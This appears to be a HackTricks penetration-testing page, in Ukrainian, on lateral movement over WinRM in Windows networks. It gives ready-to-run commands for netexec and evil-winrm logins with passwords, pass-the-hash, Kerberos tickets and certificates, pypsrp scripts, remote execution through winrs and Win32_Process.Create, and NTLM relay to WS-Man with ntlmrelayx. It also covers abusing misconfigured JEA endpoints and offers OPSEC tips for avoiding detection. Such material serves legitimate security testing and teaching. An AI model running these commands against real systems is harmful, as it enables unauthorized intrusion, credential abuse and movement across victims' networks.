# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM — один із найзручніших транспортів для **lateral movement** у середовищах Windows, оскільки він надає віддалену оболонку через **WS-Man/HTTP(S)** без потреби у трюках зі створенням служб через SMB. Якщо ціль прослуховує **5985/5986**, а ваш принципал має право використовувати remoting, часто можна дуже швидко перейти від «дійсних облікових даних» до «інтерактивної оболонки».

Щоб дізнатися про **перелік протоколів/служб**, listeners, увімкнення WinRM, `Invoke-Command` і загальне використання клієнта, дивіться:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Чому оператори полюбляють WinRM

- Використовує **HTTP/HTTPS** замість SMB/RPC, тому часто працює там, де заблоковано виконання в стилі PsExec.
- З **Kerberos** не потрібно надсилати цільовій системі облікові дані, які можна повторно використати.
- Без проблем працює з інструментами для **Windows**, **Linux** і **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Інтерактивний шлях PowerShell remoting запускає на цілі **`wsmprovhost.exe`** у контексті автентифікованого користувача, що з операційної точки зору відрізняється від виконання через службу.

## Модель доступу та передумови

На практиці успішний lateral movement через WinRM залежить від **трьох** речей:

1. На цілі є **WinRM listener** (`5985`/`5986`) і правила firewall дозволяють доступ.
2. Обліковий запис може **автентифікуватися** на кінцевій точці.
3. Обліковий запис має право **відкрити remoting session**.

Поширені способи отримати такий доступ:

- **Local Administrator** на цільовій системі.
- Членство в групі **Remote Management Users** у новіших системах або **WinRMRemoteWMIUsers__** у системах/компонентах, які досі враховують цю групу.
- Явно делеговані права на remoting через дескриптори безпеки системи / зміни ACL PowerShell remoting.

Якщо ви вже контролюєте систему з правами адміністратора, пам’ятайте, що доступ до WinRM можна також **делегувати без членства в групі адміністраторів** за допомогою методів, описаних тут:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Нюанси автентифікації, важливі під час lateral movement

- **Kerberos вимагає hostname/FQDN**. Якщо підключатися за IP-адресою, клієнт зазвичай переходить на **NTLM/Negotiate**.
- У **workgroup** або в крайових випадках між доменами з різними trust-відношеннями для NTLM зазвичай потрібен або **HTTPS**, або додавання цілі до **TrustedHosts** на клієнті.
- Для локальних облікових записів через Negotiate у workgroup обмеження віддаленого доступу UAC можуть завадити підключенню, якщо не використовується вбудований обліковий запис Administrator або не встановлено `LocalAccountTokenFilterPolicy=1`.
- За замовчуванням PowerShell remoting використовує SPN **`HTTP/<host>`**. У середовищах, де **`HTTP/<host>`** уже зареєстровано за іншим сервісним обліковим записом, автентифікація WinRM через Kerberos може завершитися помилкою `0x80090322`; використовуйте SPN із зазначеним портом або перейдіть на **`WSMAN/<host>`**, якщо цей SPN існує.<sup>[[3]](#references)</sup>

Якщо під час password spraying ви отримали дійсні облікові дані, перевірити їх через WinRM — часто найшвидший спосіб з’ясувати, чи дають вони змогу отримати оболонку:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement з Linux до Windows

### NetExec / CrackMapExec для перевірки та разового виконання

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM для інтерактивних shell

`evil-winrm` залишається найзручнішим інтерактивним варіантом у Linux, оскільки підтримує **паролі**, **NT-хеші**, **квитки Kerberos**, **сертифікати клієнта**, передавання файлів і завантаження PowerShell/.NET у пам’ять.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Граничний випадок Kerberos SPN: `HTTP` vs `WSMAN`

Коли SPN за замовчуванням **`HTTP/<host>`** спричиняє збої Kerberos, спробуйте запросити/використати натомість квиток **`WSMAN/<host>`**. Таке трапляється в захищених або незвичних корпоративних середовищах, де **`HTTP/<host>`** уже прив’язаний до іншого облікового запису служби.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Це також корисно після зловживання **RBCD / S4U**, коли ви спеціально підробили або запросили service ticket для **WSMAN**, а не загальний ticket для `HTTP`.

### Автентифікація на основі сертифікатів

WinRM також підтримує **автентифікацію за клієнтським сертифікатом**, але сертифікат має бути зіставлений на цільовій системі з **локальним обліковим записом**. З погляду offensive security це важливо, коли:

- ви вже викрали/експортували дійсний клієнтський сертифікат і приватний ключ, зіставлені з WinRM;
- ви зловживали **AD CS / Pass-the-Certificate**, щоб отримати сертифікат для принципала, а потім перейти до іншого шляху автентифікації;
- ви працюєте в середовищах, де навмисно уникають віддаленого доступу з автентифікацією за паролем.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Автентифікація WinRM за допомогою клієнтського сертифіката трапляється значно рідше, ніж автентифікація за паролем/хешем/Kerberos, але за її наявності вона може забезпечити шлях для **латерального переміщення без пароля**, який залишається доступним після ротації пароля.

### Python / автоматизація з `pypsrp`

Якщо вам потрібна автоматизація, а не оболонка оператора, `pypsrp` надає доступ до WinRM/PSRP із Python і підтримує **NTLM**, **автентифікацію за сертифікатом**, **Kerberos** і **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Якщо вам потрібен точніший контроль, ніж надає високорівнева обгортка `Client`, API нижчого рівня `WSMan` + `RunspacePool` стануть у пригоді для вирішення двох поширених проблем оператора:

- примусово використовувати **`WSMAN`** як службу/SPN Kerberos замість очікуваного за замовчуванням **`HTTP`**, яке використовують багато клієнтів PowerShell;
- підключатися до **кінцевої точки PSRP, відмінної від типової**, наприклад до **JEA** / користувацької конфігурації сеансу замість `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Користувацькі кінцеві точки PSRP і JEA мають значення під час lateral movement

Успішна автентифікація WinRM **не** завжди означає, що ви потрапите до кінцевої точки `Microsoft.PowerShell` за замовчуванням без обмежень. У зрілих середовищах можуть бути доступні **користувацькі конфігурації сеансів** або кінцеві точки **JEA** з власними ACL і поведінкою run-as.<sup>[[1]](#references)</sup>

Якщо ви вже маєте виконання коду на хості Windows і хочете з’ясувати, які поверхні remoting доступні, перелічіть зареєстровані кінцеві точки:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Коли доступний корисний endpoint, націлюйтеся безпосередньо на нього, а не на shell за замовчуванням:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Практичні наслідки для offensive-операцій:

- Навіть **обмежена** кінцева точка може бути достатньою для lateral movement, якщо вона надає саме ті cmdlets/functions, які потрібні для керування службами, доступу до файлів, створення процесів або довільного виконання команд .NET / зовнішніх команд.
- **Неправильно налаштована JEA**-роль особливо цінна, якщо вона надає небезпечні команди, як-от `Start-Process`, широкі шаблони з wildcard-символами, провайдери з доступом на запис або власні proxy functions, що дають змогу обійти передбачені обмеження.
- Кінцеві точки, що використовують **віртуальні облікові записи RunAs** або **gMSA**, змінюють ефективний контекст безпеки команд, які ви запускаєте. Зокрема, кінцева точка на базі gMSA може забезпечити **мережеву ідентичність на другому переході**, навіть якщо звичайний сеанс WinRM зіткнувся б із класичною проблемою делегування.

Для власної обмеженої кінцевої точки окремо перевірте ефективні дозволи на виконання команд і скриптів: короткий список `Get-Command` сам по собі не доводить, що наявний `.ps1` не можна запустити. [Можливості ролей JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) явно визначають, які шляхи до скриптів можна викликати; інші власні кінцеві точки можуть застосовувати інші правила сеансу. Якщо дозволений скрипт використовує збережений `SecureString` для створення облікових даних для іншого хоста, blob, створений без явного ключа, використовує [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) і зазвичай потребує контексту користувача й комп’ютера, які захищають його, для розшифрування. Перш ніж вважати доступне для запису джерело або скопійований blob шляхом підвищення привілеїв між хостами, перевірте ACL скрипту, дозволені способи його виклику, ідентичність run-as і права на облікові дані для подальшого доступу. Не виводьте захищене значення під час пасивного перерахування.

Для власної функції JEA, яка приймає шлях до файлу, разом перевірте ACL зареєстрованої кінцевої точки, призначену можливість ролі та ефективну ідентичність run-as. Викликач може мати `NoLanguage`, тоді як тіло функції виконується в режимі мови за замовчуванням системи; віртуальний обліковий запис також може мати права локального адміністратора. Якщо функція перевіряє дозволений каталог за необробленим рядковим префіксом, а потім читає переданий шлях, компоненти `..` можуть вказувати за межі цього каталогу. Межа визначається розв’язаним шляхом у контексті ідентичності функції, а не режимом мови викликача чи видимим префіксом. Перш ніж вважати доступний для читання файл `.psrc` або `.pssc` знахідкою привілейованого читання файлів, підтвердьте, що функція справді доступна, а також перевірте валідацію кінцевого шляху. Див. рекомендації Microsoft щодо [можливостей ролей JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) і [міркувань безпеки](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement у Windows за допомогою вбудованого WinRM

### `winrs.exe`

`winrs.exe` вбудований у систему й корисний, коли потрібне **виконання команд через вбудований WinRM** без відкриття інтерактивного сеансу PowerShell remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Два прапорці легко забути, але на практиці вони мають значення:

- `/noprofile` часто потрібен, коли віддалений principal **не є** локальним адміністратором.
- `/allowdelegate` дає віддаленій оболонці змогу використовувати ваші облікові дані для доступу до **третього хоста** (наприклад, коли команді потрібен `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

На практиці `winrs.exe` зазвичай створює віддалений ланцюжок процесів, подібний до:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Це варто пам’ятати, оскільки цей спосіб відрізняється від виконання на основі служб і інтерактивних сеансів PSRP.

### `winrm.cmd` / WS-Man COM замість віддаленого керування PowerShell

Також можна виконувати команди через **транспорт WinRM** без `Enter-PSSession`, викликаючи класи WMI через WS-Man. Транспортом залишається WinRM, а примітивом віддаленого виконання стає **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Цей підхід корисний, коли:

- За журналами PowerShell ретельно стежать.
- Вам потрібен **транспорт WinRM**, але не класичний робочий процес PS remoting.
- Ви створюєте власні інструменти для об’єкта COM **`WSMan.Automation`** або використовуєте їх.

## NTLM relay до WinRM (WS-Man)

Коли relay через SMB заблоковано через підписування, а relay через LDAP обмежено, **WS-Man/WinRM** усе ще може бути привабливою ціллю для relay. Сучасний `ntlmrelayx.py` містить **сервери WinRM relay** і може виконувати relay на цілі **`wsman://`** або **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Дві практичні нотатки:

- Relay найкорисніший, коли ціль приймає **NTLM**, а ретрансльований принципал має право використовувати WinRM.
- У свіжому коді Impacket окремо обробляються запити **`WSMANIDENTIFY: unauthenticated`**, щоб проби на кшталт `Test-WSMan` не переривали процес relay.

Щоб дізнатися про обмеження multi-hop після отримання першої WinRM-сесії, дивіться:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Нотатки щодо OPSEC і виявлення

- **Інтерактивне PowerShell remoting** зазвичай створює на цілі процес **`wsmprovhost.exe`**.
- **`winrs.exe`** зазвичай створює **`winrshost.exe`**, а потім запитаний дочірній процес.
- Користувацькі кінцеві точки **JEA** можуть виконувати дії від імені віртуальних облікових записів **`WinRM_VA_*`** або налаштованого **gMSA**. Це змінює як телеметрію, так і поведінку другого переходу порівняно зі звичайною оболонкою в контексті користувача.<sup>[[1]](#references)</sup>
- Якщо використовувати PSRP, а не необроблений `cmd.exe`, очікуйте телеметрію мережевого входу, події служби WinRM і журналювання PowerShell operational/script-block.
- Якщо потрібна лише одна команда, `winrs.exe` або одноразове виконання через WinRM може бути менш помітним, ніж тривала інтерактивна remoting-сесія.
- Якщо доступний Kerberos, віддавайте перевагу **FQDN + Kerberos** замість IP + NTLM, щоб зменшити проблеми з довірою та уникнути незручних змін `TrustedHosts` на клієнті.

## References

- [1] [Microsoft: міркування щодо безпеки JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp: файл README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: помилка `0x80090322` під час підключення PowerShell до віддаленого сервера через WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
